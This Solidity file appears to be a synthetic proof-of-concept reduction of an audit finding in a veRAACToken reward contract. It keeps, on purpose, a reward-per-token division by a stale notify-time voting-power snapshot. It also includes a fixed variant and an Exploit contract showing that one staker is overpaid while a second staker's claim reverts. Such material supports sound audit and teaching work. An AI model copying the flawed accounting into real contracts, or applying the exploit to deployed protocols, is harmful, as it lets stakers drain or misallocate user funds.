// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum veRAACToken — rewardPerToken divides by totalVotingPowerAtNotify
    (Pashov C-06, finding 66339). SYNTHETIC, cheatcode-free reduction.
    Root cause: notifyRewardAmount snapshots total voting power, and later locks
    do not refresh it. After the reward period, each locker is paid as if they
    were the only voter, so claims exceed the notified balance and the second
    claim reverts. Same bug as AuditVault 66160, shipped under this id. Vulnerable division preserved verbatim below (@> VULN). */

contract ERC20Mini {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "bal");
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract VeRAACToken {
    uint256 public constant PRECISION = 1e18;
    uint256 public constant DURATION = 7 days;
    uint256 public constant YEAR = 365 days;

    struct RewardData {
        uint256 rewardRate;
        uint256 periodFinish;
        uint256 lastUpdateTime;
        uint256 rewardPerTokenStored;
        uint256 totalVotingPowerAtNotify;
    }

    ERC20Mini public stakeToken;
    mapping(address => RewardData) public rewardData;
    mapping(address => uint256) public votingPower;
    mapping(address => mapping(address => uint256)) public userRewardPerTokenPaid;
    uint256 public totalVotingPower;

    constructor(ERC20Mini stakeToken_) {
        stakeToken = stakeToken_;
    }

    function lock(uint256 amount, uint256 duration) external {
        require(stakeToken.transferFrom(msg.sender, address(this), amount), "lock");
        uint256 vp = amount * duration / YEAR;
        votingPower[msg.sender] += vp;
        totalVotingPower += vp;
    }

    function notifyRewardAmount(address rewardToken, uint256 amount) external {
        require(ERC20Mini(rewardToken).transferFrom(msg.sender, address(this), amount), "fund");
        RewardData storage r = rewardData[rewardToken];
        r.rewardRate = amount * PRECISION / DURATION;
        r.lastUpdateTime = block.timestamp;
        r.periodFinish = block.timestamp + DURATION;
        r.rewardPerTokenStored = 0;
        r.totalVotingPowerAtNotify = totalVotingPower; // S3
    }

    function rewardPerToken(address rewardToken) public view returns (uint256) {
        RewardData memory rData = rewardData[rewardToken];

        uint256 totalVeSupply = rData.totalVotingPowerAtNotify;
        if (totalVeSupply == 0) {
            return rData.rewardPerTokenStored;
        }

        uint256 lastTimeRewardApplicable = _lastTimeRewardApplicable(rData.periodFinish);
        if (lastTimeRewardApplicable <= rData.lastUpdateTime) {
            return rData.rewardPerTokenStored;
        }

        uint256 timeDelta = lastTimeRewardApplicable - rData.lastUpdateTime;
        uint256 rewardDelta = (timeDelta * rData.rewardRate) / PRECISION;

        // Use total supply from notification time
        uint256 rewardPerTokenDelta = (rewardDelta * PRECISION) / totalVeSupply; // @> VULN: denominator is the notify-time snapshot, not the voting power that actually accrued
        // FIX: divide by the current totalVotingPower so later lockers dilute the index
        return rData.rewardPerTokenStored + rewardPerTokenDelta;
    }

    function earned(address user, address rewardToken) public view returns (uint256) {
        uint256 rpt = rewardPerToken(rewardToken);
        return (votingPower[user] * (rpt - userRewardPerTokenPaid[rewardToken][user])) / PRECISION;
    }

    function claim(address rewardToken) external {
        uint256 amt = earned(msg.sender, rewardToken);
        require(amt > 0, "zero");
        userRewardPerTokenPaid[rewardToken][msg.sender] = rewardPerToken(rewardToken);
        require(ERC20Mini(rewardToken).transfer(msg.sender, amt), "transfer");
    }

    function _lastTimeRewardApplicable(uint256 periodFinish) internal view returns (uint256) {
        return block.timestamp < periodFinish ? block.timestamp : periodFinish;
    }
}

contract VeFixed {
    uint256 public constant PRECISION = 1e18;
    uint256 public constant DURATION = 7 days;
    uint256 public constant YEAR = 365 days;
    ERC20Mini public stakeToken;
    uint256 public totalVotingPower;
    uint256 public rewardRate;
    uint256 public periodFinish;
    uint256 public lastUpdateTime;
    mapping(address => uint256) public votingPower;
    mapping(address => uint256) public paid;

    constructor(ERC20Mini stakeToken_) {
        stakeToken = stakeToken_;
    }

    function lock(uint256 amount, uint256 duration) external {
        require(stakeToken.transferFrom(msg.sender, address(this), amount), "lock");
        uint256 vp = amount * duration / YEAR;
        votingPower[msg.sender] += vp;
        totalVotingPower += vp;
    }

    function notifyRewardAmount(address rewardToken, uint256 amount) external {
        require(ERC20Mini(rewardToken).transferFrom(msg.sender, address(this), amount), "fund");
        rewardRate = amount * PRECISION / DURATION;
        lastUpdateTime = block.timestamp;
        periodFinish = block.timestamp + DURATION;
    }

    function earned(address user) public view returns (uint256) {
        uint256 elapsed = block.timestamp < periodFinish ? block.timestamp : periodFinish;
        if (elapsed <= lastUpdateTime || totalVotingPower == 0) return 0;
        uint256 rewardDelta = ((elapsed - lastUpdateTime) * rewardRate) / PRECISION;
        uint256 rpt = (rewardDelta * PRECISION) / totalVotingPower;
        return (votingPower[user] * rpt) / PRECISION;
    }

    function claim(address rewardToken) external {
        uint256 amt = earned(msg.sender);
        require(amt > 0, "zero");
        paid[msg.sender] = amt;
        require(ERC20Mini(rewardToken).transfer(msg.sender, amt), "transfer");
    }
}

contract Staker {
    function fundAndLock(ERC20Mini raac, VeRAACToken ve, uint256 amt) external {
        raac.approve(address(ve), amt);
        ve.lock(amt, 365 days);
    }

    function claim(VeRAACToken ve, address usdt) external {
        ve.claim(usdt);
    }

    function tryClaim(VeRAACToken ve, address usdt) external returns (bool) {
        try ve.claim(usdt) {
            return true;
        } catch {
            return false;
        }
    }
}

contract Exploit {
    ERC20Mini public raac; // nonce 1
    ERC20Mini public usdt; // nonce 2
    VeRAACToken public ve; // nonce 3 — vulnerable rewardPerToken
    Staker public bob; // nonce 4
    Staker public alice; // nonce 5
    uint256 public constant LOCK = 100 ether;
    uint256 public constant NOTIFIED = 100_000_000;
    uint256 public owed;
    uint256 public bobPayout;
    bool public aliceClaimReverted;

    constructor() {
        raac = new ERC20Mini();
        usdt = new ERC20Mini();
        ve = new VeRAACToken(raac);
        bob = new Staker();
        alice = new Staker();
        raac.mint(address(bob), LOCK);
        raac.mint(address(alice), LOCK);
        usdt.mint(address(this), NOTIFIED);
    }

    function setupPositions() external {
        bob.fundAndLock(raac, ve, LOCK); // S1
        usdt.approve(address(ve), NOTIFIED);
        ve.notifyRewardAmount(address(usdt), NOTIFIED); // S2
        alice.fundAndLock(raac, ve, LOCK); // S4
    }

    function run() external {
        uint256 b = ve.earned(address(bob), address(usdt));
        uint256 a = ve.earned(address(alice), address(usdt));
        owed = b + a;
        require(owed > NOTIFIED, "not over-accounted");
        bob.claim(ve, address(usdt));
        aliceClaimReverted = !alice.tryClaim(ve, address(usdt));
        bobPayout = usdt.balanceOf(address(bob));
        require(aliceClaimReverted && bobPayout == b && b > NOTIFIED / 2, "alice paid or bob not overpaid"); // S6
        require(usdt.balanceOf(address(alice)) == 0, "alice received rewards");
    }
}
